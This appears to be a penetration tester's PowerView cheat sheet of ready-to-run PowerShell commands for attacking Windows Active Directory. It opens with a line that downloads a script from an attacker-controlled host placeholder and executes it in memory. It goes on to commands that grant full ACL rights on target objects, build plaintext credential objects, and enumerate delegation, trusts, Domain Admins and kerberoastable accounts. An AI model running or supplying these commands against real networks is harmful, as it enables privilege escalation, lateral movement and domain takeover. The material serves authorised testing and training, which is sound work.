 % ad, windows, powerview

# load from remote

https://github.com/PowerShellMafia/PowerSploit/ powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX 

# Set alternative creds to use
Example : Use with commands as "-Credential $creds" powershell
$passwd = ConvertTo-SecureString "<password>" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ("<domain>\<user>", $passwd) 

# Get User from SID
ConvertFrom-SID <sid> 

# Find user ACL 
Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} 

# Find all domain user ACL
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} 

# Add user DACL
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <current_user> -Rights All 

# Find all groups our current user got access
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} 

# Find all users our current user got access
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} 


# Add GenericAll to target for user
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights All 

# Find all Computer with unconstrained delegation
Get-DomainComputer -Unconstrained 

# Get all domain trust 
Get-DomainTrustMapping 

# Get all members of a a given group
Example: Get-DomainGroupMember "Domain Admins" -Recurse powershell
Get-DomainGroupMember -Identity "<group|Administrators>" -Domain <domain> -Recurse 



# Get list of kerberoastable users
Description : The following will enumerate 'Kerberoastable' users for a given domain powershell
Get-DomainUser -SPN -Domain <domain> | select name, samaccountname, serviceprincipalname 
